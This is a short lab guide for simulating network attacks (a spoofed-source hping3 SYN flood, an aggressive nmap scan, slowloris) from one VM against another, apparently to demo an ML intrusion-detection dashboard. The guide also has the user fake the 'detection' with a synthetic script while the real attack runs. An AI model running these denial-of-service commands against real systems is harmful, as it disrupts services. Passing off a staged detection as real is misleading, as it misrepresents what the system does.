# Real Attack Simulation Guide

Use these commands on your **Ubuntu Client VM** to simulate network-level attacks against the **Ubuntu Server VM** (`192.168.1.100`).

> [!WARNING]
> Only run these commands in an isolated lab environment. These tools generate significant network traffic.

## 1. Prerequisites
Install the required security tools on your Ubuntu Client:
```bash
sudo apt update
sudo apt install -y hping3 nmap slowloris
```

---

## 2. Attack Scenarios

### Scenario A: SYN Flood (DDoS)
Simulates a high-volume TCP SYN flood to overwhelm the server's connection table.
```bash
# -S (SYN), -p (Port 80), --flood (Max speed), --rand-source (Spoof IPs)
sudo hping3 -S 192.168.1.100 -p 80 --flood --rand-source
```
*Effect: Check the Dashboard. Even if the ML doesn't "auto-detect" this (unless it's sniffing real traffic), the server's response time might increase.*

### Scenario B: Stealthy Port Scan
Simulates an attacker reconnaissance phase.
```bash
# -sS (TCP SYN Scan), -T4 (Aggressive speed), -A (OS/Version Detection)
sudo nmap -sS -T4 -A 192.168.1.100
```
*Effect: This creates multiple connection attempts across many ports.*

### Scenario C: Slowloris (Low & Slow DDoS)
Tries to exhaust the server's thread pool by keeping HTTP connections open as long as possible.
```bash
slowloris 192.168.1.100
```

---

## 3. Connecting Real Traffic to SentinAI ML
Since the current version of **SentinAI NetGuard** uses a **Synthetic Generator** inside the backend container to show data in the Dashboard, real traffic from `hping3` won't automatically appear in the graphs unless the backend is modified to "sniff" the network interface.

**To bridge the gap for your demo:**
1.  **Launch the Real Attack** from the Ubuntu Client.
2.  **Simulate the Detection** on the Server simultaneously to represent the system's "Alert" state:
    ```bash
    # On the Ubuntu Server
    docker-compose exec backend python backend/tools/simulate_attack.py --type ddos --count 100
    ```

This demonstrates the **Red-Blue Team workflow**:
- **Red Team** (Client VM) performs the real attack.
- **Blue Team** (Server/Sentinel) detects and visualizes the attack profile.
